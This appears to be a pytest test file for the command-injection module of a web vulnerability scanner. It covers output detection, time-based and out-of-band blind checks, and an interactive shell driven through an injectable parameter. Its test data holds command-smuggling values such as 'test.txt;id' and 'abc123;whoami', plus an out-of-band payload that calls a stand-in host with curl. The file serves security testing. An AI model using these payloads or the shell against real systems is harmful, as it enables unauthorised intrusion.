"""Unit tests for Command Injection module"""

import pytest
import asyncio
from unittest.mock import AsyncMock, MagicMock, patch

from app.modules.command_injection import (
    CommandInjectionTester,
    InteractiveShell,
    InjectionPoint,
    CommandInjectionType,
    CommandSeparator,
    CommandInjectionResult,
)
from app.core.request_handler import RequestHandler, Response
from app.core.oob_listener import OOBListener, Callback
from datetime import datetime, timezone


class TestCommandInjectionTester:
    """Test suite for CommandInjectionTester"""

    @pytest.fixture
    def mock_request_handler(self):
        """Create a mock RequestHandler"""
        handler = MagicMock(spec=RequestHandler)
        handler.send_request = AsyncMock()
        return handler

    @pytest.fixture
    def mock_oob_listener(self):
        """Create a mock OOBListener"""
        listener = MagicMock(spec=OOBListener)
        listener.generate_unique_id = MagicMock(return_value="test-unique-id-123")
        listener.get_callback_url = MagicMock(return_value="http://oob.example.com/test-unique-id-123")
        listener.get_dns_callback = MagicMock(return_value="test-unique-id-123.oob.example.com")
        listener.wait_for_callback = AsyncMock(return_value=None)
        listener.register_payload = AsyncMock()
        listener.domain = "oob.example.com"
        listener.http_port = 8080
        listener.dns_port = 53
        return listener

    @pytest.fixture
    def tester(self, mock_request_handler):
        """Create a CommandInjectionTester instance"""
        return CommandInjectionTester(mock_request_handler)

    @pytest.fixture
    def tester_with_oob(self, mock_request_handler, mock_oob_listener):
        """Create a CommandInjectionTester instance with OOB listener"""
        return CommandInjectionTester(mock_request_handler, mock_oob_listener)

    @pytest.fixture
    def sample_injection_point(self):
        """Create a sample injection point"""
        return InjectionPoint(
            parameter="filename",
            location="query",
            original_value="test.txt",
            url="http://example.com/view?filename=test.txt",
            method="GET",
        )

    def test_tester_initialization(self, mock_request_handler):
        """Test CommandInjectionTester initialization"""
        tester = CommandInjectionTester(mock_request_handler)
        assert tester.request_handler == mock_request_handler
        assert tester.payload_engine is not None
        
        # Check that default payloads are loaded
        assert tester.payload_engine.get_payload_count("cmd_direct") > 0
        assert tester.payload_engine.get_payload_count("cmd_time_based") > 0

    def test_tester_initialization_with_oob(self, mock_request_handler, mock_oob_listener):
        """Test CommandInjectionTester initialization with OOB listener"""
        tester = CommandInjectionTester(mock_request_handler, mock_oob_listener)
        assert tester.oob_listener == mock_oob_listener

    def test_detect_command_output_unix_uid(self, tester):
        """Test detection of Unix uid output"""
        response_text = "uid=1000(user) gid=1000(user) groups=1000(user)"
        found, pattern = tester._detect_command_output(response_text)
        
        assert found is True
        assert pattern is not None
        assert "uid=" in pattern

    def test_detect_command_output_passwd(self, tester):
        """Test detection of /etc/passwd output"""
        response_text = "root:x:0:0:root:/root:/bin/bash"
        found, pattern = tester._detect_command_output(response_text)
        
        assert found is True
        assert pattern is not None

    def test_detect_command_output_windows_path(self, tester):
        """Test detection of Windows path"""
        response_text = "C:\\Windows\\System32\\cmd.exe"
        found, pattern = tester._detect_command_output(response_text)
        
        assert found is True
        assert pattern is not None

    def test_detect_command_output_ls_output(self, tester):
        """Test detection of ls -la output"""
        response_text = "total 48\ndrwxr-xr-x 2 user user 4096 Jan 1 12:00 ."
        found, pattern = tester._detect_command_output(response_text)
        
        assert found is True
        assert pattern is not None

    def test_detect_command_output_no_match(self, tester):
        """Test no command output detection"""
        response_text = "This is a normal response with no command output"
        found, pattern = tester._detect_command_output(response_text)
        
        assert found is False
        assert pattern is None

    def test_extract_delay_from_command_sleep(self, tester):
        """Test delay extraction from sleep command"""
        command = "sleep 5"
        delay = tester._extract_delay_from_command(command)
        assert delay == 5.0

    def test_extract_delay_from_command_timeout(self, tester):
        """Test delay extraction from timeout command"""
        command = "timeout /t 10"
        delay = tester._extract_delay_from_command(command)
        assert delay == 10.0

    def test_extract_delay_from_command_ping(self, tester):
        """Test delay extraction from ping command"""
        command = "ping -c 7 127.0.0.1"
        delay = tester._extract_delay_from_command(command)
        assert delay == 7.0

    def test_extract_delay_from_command_default(self, tester):
        """Test default delay extraction"""
        command = "whoami"
        delay = tester._extract_delay_from_command(command)
        assert delay == 5.0  # Default

    def test_generate_oob_payloads(self, tester_with_oob):
        """Test OOB payload generation"""
        unique_id = "test-id-123"
        payloads = tester_with_oob._generate_oob_payloads(unique_id)
        
        assert isinstance(payloads, dict)
        assert len(payloads) > 0
        
        # Check for Unix/Linux payloads
        assert "curl_http" in payloads
        assert "wget_http" in payloads
        assert "nslookup_dns" in payloads
        
        # Check for Windows payloads
        assert "powershell_http" in payloads
        assert "nslookup_win_dns" in payloads
        
        # Verify payload content
        assert "curl" in payloads["curl_http"]
        assert "wget" in payloads["wget_http"]
        assert "nslookup" in payloads["nslookup_dns"]

    @pytest.mark.asyncio
    async def test_direct_injection_vulnerable(self, tester, sample_injection_point):
        """Test direct injection detection when vulnerable"""
        # Mock baseline response
        baseline_response = Response(
            status_code=200,
            headers={},
            body=b"Normal response",
            text="Normal response",
            elapsed_time=0.1,
            request=MagicMock(),
            history=[],
        )
        
        # Mock vulnerable response with command output
        vulnerable_response = Response(
            status_code=200,
            headers={},
            body=b"uid=1000(user) gid=1000(user) groups=1000(user)",
            text="uid=1000(user) gid=1000(user) groups=1000(user)",
            elapsed_time=0.1,
            request=MagicMock(),
            history=[],
        )
        
        # Set up mock to return baseline first, then vulnerable response
        tester.request_handler.send_request.side_effect = [
            baseline_response,
            vulnerable_response,
        ]
        
        result = await tester._test_direct_injection(sample_injection_point)
        
        assert result is not None
        assert result.is_vulnerable
        assert result.injection_type == CommandInjectionType.DIRECT
        assert result.separator is not None
        assert result.confidence >= 0.9

    @pytest.mark.asyncio
    async def test_direct_injection_not_vulnerable(self, tester, sample_injection_point):
        """Test direct injection detection when not vulnerable"""
        # Mock normal responses
        normal_response = Response(
            status_code=200,
            headers={},
            body=b"Normal response",
            text="Normal response",
            elapsed_time=0.1,
            request=MagicMock(),
            history=[],
        )
        
        tester.request_handler.send_request.return_value = normal_response
        
        result = await tester._test_direct_injection(sample_injection_point)
        
        assert result is not None
        assert not result.is_vulnerable
        assert result.confidence == 0.0

    @pytest.mark.asyncio
    async def test_time_based_blind_vulnerable(self, tester, sample_injection_point):
        """Test time-based blind injection detection when vulnerable"""
        # Mock baseline responses (fast)
        baseline_response = Response(
            status_code=200,
            headers={},
            body=b"Response",
            text="Response",
            elapsed_time=0.1,
            request=MagicMock(),
            history=[],
        )
        
        # Mock delayed responses (slow - indicating sleep command executed)
        delayed_response = Response(
            status_code=200,
            headers={},
            body=b"Response",
            text="Response",
            elapsed_time=5.5,  # 5 second delay + baseline
            request=MagicMock(),
            history=[],
        )
        
        # Mock time.time() to simulate delays
        time_values = [
            0.0, 0.1,  # Baseline 1
            0.2, 0.3,  # Baseline 2
            0.4, 0.5,  # Baseline 3
            1.0, 6.5,  # First delayed request (5.5 second delay)
            7.0, 12.5, # Verification delayed request (5.5 second delay)
        ]
        
        with patch('time.time', side_effect=time_values):
            # Set up mock responses
            responses = [
                baseline_response,  # Baseline 1
                baseline_response,  # Baseline 2
                baseline_response,  # Baseline 3
                delayed_response,   # Delayed response
                delayed_response,   # Verification
            ]
            
            tester.request_handler.send_request.side_effect = responses
            
            result = await tester._test_time_based_blind(sample_injection_point)
        
        assert result is not None
        assert result.is_vulnerable
        assert result.injection_type == CommandInjectionType.BLIND_TIME
        assert result.confidence >= 0.85

    @pytest.mark.asyncio
    async def test_time_based_blind_not_vulnerable(self, tester, sample_injection_point):
        """Test time-based blind injection when not vulnerable"""
        # Mock consistent fast responses
        fast_response = Response(
            status_code=200,
            headers={},
            body=b"Response",
            text="Response",
            elapsed_time=0.1,
            request=MagicMock(),
            history=[],
        )
        
        tester.request_handler.send_request.return_value = fast_response
        
        result = await tester._test_time_based_blind(sample_injection_point)
        
        assert result is not None
        assert not result.is_vulnerable
        assert result.confidence == 0.0

    @pytest.mark.asyncio
    async def test_oob_blind_vulnerable(self, tester_with_oob, sample_injection_point):
        """Test OOB blind injection detection when vulnerable"""
        # Mock response
        response = Response(
            status_code=200,
            headers={},
            body=b"Response",
            text="Response",
            elapsed_time=0.1,
            request=MagicMock(),
            history=[],
        )
        
        tester_with_oob.request_handler.send_request.return_value = response
        
        # Mock OOB callback
        mock_callback = Callback(
            callback_id="callback-123",
            unique_id="test-unique-id-123",
            callback_type="http",
            source_ip="192.168.1.100",
            timestamp=datetime.now(timezone.utc),
            data={"method": "GET", "path": "/test-unique-id-123"},
        )
        
        tester_with_oob.oob_listener.wait_for_callback.return_value = mock_callback
        
        result = await tester_with_oob._test_oob_blind(sample_injection_point)
        
        assert result is not None
        assert result.is_vulnerable
        assert result.injection_type == CommandInjectionType.BLIND_OOB
        assert result.confidence >= 0.9
        assert result.oob_callback_id == "callback-123"

    @pytest.mark.asyncio
    async def test_oob_blind_not_vulnerable(self, tester_with_oob, sample_injection_point):
        """Test OOB blind injection when not vulnerable"""
        # Mock response
        response = Response(
            status_code=200,
            headers={},
            body=b"Response",
            text="Response",
            elapsed_time=0.1,
            request=MagicMock(),
            history=[],
        )
        
        tester_with_oob.request_handler.send_request.return_value = response
        
        # Mock no callback (timeout)
        tester_with_oob.oob_listener.wait_for_callback.return_value = None
        
        result = await tester_with_oob._test_oob_blind(sample_injection_point)
        
        assert result is not None
        assert not result.is_vulnerable
        assert result.confidence == 0.0

    @pytest.mark.asyncio
    async def test_oob_blind_without_listener(self, tester, sample_injection_point):
        """Test OOB blind injection without OOB listener"""
        result = await tester._test_oob_blind(sample_injection_point)
        
        assert result is None

    @pytest.mark.asyncio
    async def test_send_request_query_location(self, tester, sample_injection_point):
        """Test sending request with query parameter injection"""
        mock_response = Response(
            status_code=200,
            headers={},
            body=b"Response",
            text="Response",
            elapsed_time=0.1,
            request=MagicMock(),
            history=[],
        )
        
        tester.request_handler.send_request.return_value = mock_response
        
        response = await tester._send_request(sample_injection_point, "test.txt;id")
        
        assert response == mock_response
        assert tester.request_handler.send_request.called

    @pytest.mark.asyncio
    async def test_send_request_post_location(self, tester):
        """Test sending request with POST data injection"""
        injection_point = InjectionPoint(
            parameter="backup_file",
            location="post",
            original_value="backup.tar",
            url="http://example.com/backup",
            method="POST",
            data={"backup_file": "backup.tar", "action": "restore"},
        )
        
        mock_response = Response(
            status_code=200,
            headers={},
            body=b"Response",
            text="Response",
            elapsed_time=0.1,
            request=MagicMock(),
            history=[],
        )
        
        tester.request_handler.send_request.return_value = mock_response
        
        response = await tester._send_request(injection_point, "backup.tar;whoami")
        
        assert response == mock_response
        assert tester.request_handler.send_request.called

    @pytest.mark.asyncio
    async def test_send_request_header_location(self, tester):
        """Test sending request with header injection"""
        injection_point = InjectionPoint(
            parameter="User-Agent",
            location="header",
            original_value="Mozilla/5.0",
            url="http://example.com/",
            method="GET",
            headers={"User-Agent": "Mozilla/5.0"},
        )
        
        mock_response = Response(
            status_code=200,
            headers={},
            body=b"Response",
            text="Response",
            elapsed_time=0.1,
            request=MagicMock(),
            history=[],
        )
        
        tester.request_handler.send_request.return_value = mock_response
        
        response = await tester._send_request(injection_point, "Mozilla/5.0;id")
        
        assert response == mock_response
        assert tester.request_handler.send_request.called

    @pytest.mark.asyncio
    async def test_send_request_cookie_location(self, tester):
        """Test sending request with cookie injection"""
        injection_point = InjectionPoint(
            parameter="session",
            location="cookie",
            original_value="abc123",
            url="http://example.com/",
            method="GET",
        )
        
        mock_response = Response(
            status_code=200,
            headers={},
            body=b"Response",
            text="Response",
            elapsed_time=0.1,
            request=MagicMock(),
            history=[],
        )
        
        tester.request_handler.send_request.return_value = mock_response
        
        response = await tester._send_request(injection_point, "abc123;whoami")
        
        assert response == mock_response
        assert tester.request_handler.send_request.called


class TestInteractiveShell:
    """Test suite for InteractiveShell"""

    @pytest.fixture
    def mock_request_handler(self):
        """Create a mock RequestHandler"""
        handler = MagicMock(spec=RequestHandler)
        handler.send_request = AsyncMock()
        return handler

    @pytest.fixture
    def sample_injection_point(self):
        """Create a sample injection point"""
        return InjectionPoint(
            parameter="file",
            location="query",
            original_value="data.txt",
            url="http://example.com/read?file=data.txt",
            method="GET",
        )

    @pytest.fixture
    def sample_result(self, sample_injection_point):
        """Create a sample command injection result"""
        return CommandInjectionResult(
            injection_point=sample_injection_point,
            is_vulnerable=True,
            injection_type=CommandInjectionType.DIRECT,
            separator=";",
            payload="data.txt;id",
            confidence=0.95,
        )

    @pytest.fixture
    def shell(self, mock_request_handler, sample_injection_point, sample_result):
        """Create an InteractiveShell instance"""
        return InteractiveShell(
            request_handler=mock_request_handler,
            injection_point=sample_injection_point,
            injection_result=sample_result,
        )

    def test_shell_initialization(self, mock_request_handler, sample_injection_point, sample_result):
        """Test InteractiveShell initialization"""
        shell = InteractiveShell(
            request_handler=mock_request_handler,
            injection_point=sample_injection_point,
            injection_result=sample_result,
        )
        
        assert shell.request_handler == mock_request_handler
        assert shell.injection_point == sample_injection_point
        assert shell.injection_result == sample_result
        assert len(shell.command_history) == 0

    @pytest.mark.asyncio
    async def test_execute_command(self, shell):
        """Test executing a command"""
        mock_response = Response(
            status_code=200,
            headers={},
            body=b"uid=1000(user) gid=1000(user)",
            text="uid=1000(user) gid=1000(user)",
            elapsed_time=0.1,
            request=MagicMock(),
            history=[],
        )
        
        shell.request_handler.send_request.return_value = mock_response
        
        output = await shell.execute_command("id")
        
        assert output == "uid=1000(user) gid=1000(user)"
        assert len(shell.command_history) == 1
        assert shell.command_history[0][0] == "id"
        assert shell.command_history[0][1] == output

    @pytest.mark.asyncio
    async def test_execute_multiple_commands(self, shell):
        """Test executing multiple commands"""
        responses = [
            Response(
                status_code=200,
                headers={},
                body=b"user",
                text="user",
                elapsed_time=0.1,
                request=MagicMock(),
                history=[],
            ),
            Response(
                status_code=200,
                headers={},
                body=b"/home/user",
                text="/home/user",
                elapsed_time=0.1,
                request=MagicMock(),
                history=[],
            ),
            Response(
                status_code=200,
                headers={},
                body=b"file1.txt\nfile2.txt",
                text="file1.txt\nfile2.txt",
                elapsed_time=0.1,
                request=MagicMock(),
                history=[],
            ),
        ]
        
        shell.request_handler.send_request.side_effect = responses
        
        await shell.execute_command("whoami")
        await shell.execute_command("pwd")
        await shell.execute_command("ls")
        
        assert len(shell.command_history) == 3
        assert shell.command_history[0][0] == "whoami"
        assert shell.command_history[1][0] == "pwd"
        assert shell.command_history[2][0] == "ls"

    def test_get_history(self, shell):
        """Test getting command history"""
        shell.command_history = [
            ("whoami", "user"),
            ("pwd", "/home/user"),
        ]
        
        history = shell.get_history()
        
        assert len(history) == 2
        assert history[0] == ("whoami", "user")
        assert history[1] == ("pwd", "/home/user")

    def test_clear_history(self, shell):
        """Test clearing command history"""
        shell.command_history = [
            ("whoami", "user"),
            ("pwd", "/home/user"),
        ]
        
        shell.clear_history()
        
        assert len(shell.command_history) == 0


class TestInjectionPoint:
    """Test suite for InjectionPoint dataclass"""

    def test_injection_point_creation(self):
        """Test creating an injection point"""
        point = InjectionPoint(
            parameter="filename",
            location="query",
            original_value="test.txt",
            url="http://example.com/view?filename=test.txt",
            method="GET",
        )
        
        assert point.parameter == "filename"
        assert point.location == "query"
        assert point.original_value == "test.txt"
        assert point.url == "http://example.com/view?filename=test.txt"
        assert point.method == "GET"

    def test_injection_point_with_headers(self):
        """Test creating an injection point with headers"""
        headers = {"User-Agent": "Test", "X-API-Key": "secret"}
        point = InjectionPoint(
            parameter="file",
            location="query",
            original_value="data.txt",
            url="http://example.com/read?file=data.txt",
            headers=headers,
        )
        
        assert point.headers == headers

    def test_injection_point_with_post_data(self):
        """Test creating an injection point with POST data"""
        data = {"backup_file": "backup.tar", "action": "restore"}
        point = InjectionPoint(
            parameter="backup_file",
            location="post",
            original_value="backup.tar",
            url="http://example.com/backup",
            method="POST",
            data=data,
        )
        
        assert point.data == data
        assert point.method == "POST"


class TestCommandInjectionResult:
    """Test suite for CommandInjectionResult dataclass"""

    def test_result_creation_vulnerable(self):
        """Test creating a vulnerable result"""
        injection_point = InjectionPoint(
            parameter="file",
            location="query",
            original_value="data.txt",
            url="http://example.com/read?file=data.txt",
        )
        
        result = CommandInjectionResult(
            injection_point=injection_point,
            is_vulnerable=True,
            injection_type=CommandInjectionType.DIRECT,
            separator=";",
            payload="data.txt;id",
            confidence=0.95,
            output="uid=1000(user)",
        )
        
        assert result.is_vulnerable
        assert result.injection_type == CommandInjectionType.DIRECT
        assert result.separator == ";"
        assert result.payload == "data.txt;id"
        assert result.confidence == 0.95
        assert result.output == "uid=1000(user)"

    def test_result_creation_not_vulnerable(self):
        """Test creating a not vulnerable result"""
        injection_point = InjectionPoint(
            parameter="file",
            location="query",
            original_value="data.txt",
            url="http://example.com/read?file=data.txt",
        )
        
        result = CommandInjectionResult(
            injection_point=injection_point,
            is_vulnerable=False,
            confidence=0.0,
        )
        
        assert not result.is_vulnerable
        assert result.injection_type is None
        assert result.separator is None
        assert result.confidence == 0.0

    def test_result_with_oob_callback(self):
        """Test creating a result with OOB callback"""
        injection_point = InjectionPoint(
            parameter="hostname",
            location="query",
            original_value="localhost",
            url="http://example.com/ping?hostname=localhost",
        )
        
        result = CommandInjectionResult(
            injection_point=injection_point,
            is_vulnerable=True,
            injection_type=CommandInjectionType.BLIND_OOB,
            separator=";",
            payload="localhost;curl http://oob.example.com/test-id",
            confidence=0.95,
            oob_callback_id="callback-123",
        )
        
        assert result.is_vulnerable
        assert result.injection_type == CommandInjectionType.BLIND_OOB
        assert result.oob_callback_id == "callback-123"
